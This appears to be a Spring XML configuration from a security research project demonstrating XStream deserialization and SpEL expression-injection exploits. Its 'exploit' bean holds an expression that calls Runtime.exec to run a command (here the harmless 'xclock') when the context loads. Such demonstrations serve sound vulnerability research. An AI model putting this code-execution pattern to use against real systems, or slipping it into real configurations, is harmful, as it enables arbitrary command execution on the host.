<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xmlns:p="http://www.springframework.org/schema/p"
    xsi:schemaLocation="http://www.springframework.org/schema/beans
                        http://www.springframework.org/schema/beans/spring-beans-3.0.xsd">
    
    <bean id="application" class="org.pwntester.springbreaker.EventHandlerXStreamExploit">
        <property name="marshaller" ref="xstreamMarshaller" />
        <property name="unmarshaller" ref="xstreamMarshaller" />
    </bean>


    <bean id="contact" class="com.company.model.ContactImpl">
        <property name="name" value="test" />
    </bean>


    <!-- <bean id="castorMarshaller" class="org.springframework.oxm.castor.CastorMarshaller"/> -->
    <!-- <bean id="jacksonObjectMapper" class="com.parth.web.CustomJacksonMapper"/> -->
    <!-- Betwixt, XMLBeans, JAXB -->
    <!--
    jaxb1-marshaller

    jaxb2-marshaller

    xmlbeans-marshaller

    jibx-marshaller
    -->

    <!--bean id="xstreamMarshaller" class="org.springframework.oxm.xstream.XStreamMarshaller">
        <property name="aliases">
            <props>
                <prop key="Contact">com.company.model.ContactImpl</prop>
            </props>
        </property>
    </bean-->

    <bean id="xstreamMarshaller" class="org.springframework.oxm.xstream.XStreamMarshaller">
        <property name="autodetectAnnotations" value="true" />
        <property name="annotatedClass" value="com.company.model.ContactImpl"/>
        <property name="supportedClasses" value="com.company.model.ContactImpl"/>
    </bean>


    <bean id="exploit" class="com.company.model.ContactImpl" scope="prototype" p:name="#{T(java.lang.Runtime).getRuntime().exec('xclock').toString()}"/>

</beans>